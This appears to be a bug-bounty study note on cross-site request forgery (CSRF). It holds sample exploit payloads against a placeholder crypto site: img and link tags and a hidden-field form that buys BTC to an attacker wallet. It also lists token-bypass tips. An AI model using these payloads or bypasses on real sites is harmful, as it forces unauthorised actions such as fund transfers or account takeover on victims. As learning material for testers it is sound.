CSRF

What is CSRF?
A CSRF vulnerability allows an attacker to unknowingly perform state changes on a web application where the victim is authenticated. 
CSRF does not allow theft of any data, since the attacker has no way to see the response form the webpage.

https://thexssrat.medium.com/csrf-tesguide-for-bug-bounty-hunters-d14db3462695

CSRF example:

<form action="change-email", method="POST">
 <label for="email">New email:</lable>
 <input type="email" name="new_email">
 <button type="submit"> Submit</button>
</form>

No CSRF protection allows an attack to force our victim to make a POST request to change-email without validating the origin of the request.

No CSRF token
	GET https://cryptosite.com/buy.php?wallet=something&amount=100&type=BTC

Exploit:
	An mage tag:
	<img/src="http://cryptosite.com/buy.php?wallet=something&amount=100&type=BTC">

	A Hyperlink
	<a/href="http://cryptosite.com/buy.php?wallet=something&amount=100&type=BTC"Free BTC</a>

Reusable / guessable CSRF token
	POST http://cryptosite.com/buy.php HTTP/1.1
	wallet=1337hacker&amount=100&type=BTC&xsrf_token=e3435jdf23sfdr23

Exploit
	<form action="http://cryptosite.com/buy.php" method="POST">
	<input type="hidden" name="wallet" value="1337hacker">
	<input type="hidden" name="amount" value="100"/>
	<input type="hidden" name="type" value="BTC"/>
	<input type="hidden" name="xsrf_token" value="e3435jdf23sfdr23"/>
	<input type="submit" value="Click here to win"/></form>

	e3435jdf23sfdr23 = {user_id=44}base64 encoded
	
Notes:
-Cant steal data but modify(email,user info) 
-Location of csrf may change -(headers x-csrf_token remove it and see working without it)
-sometimes it pushed to post request (see if token is there or not) Grab another csrf token and see if it works.
-dont report soon because impact is unclear.
-look for functionality-changing password, username, email and even acount takeover.

TIPS:
-Change POST request into GET request on csrf methods.
-Removing the CSRF token
-use the token of 2nd account.

Reports:

https://infosecwriteups.com/executing-csrf-with-phone-validation-103c525dd310

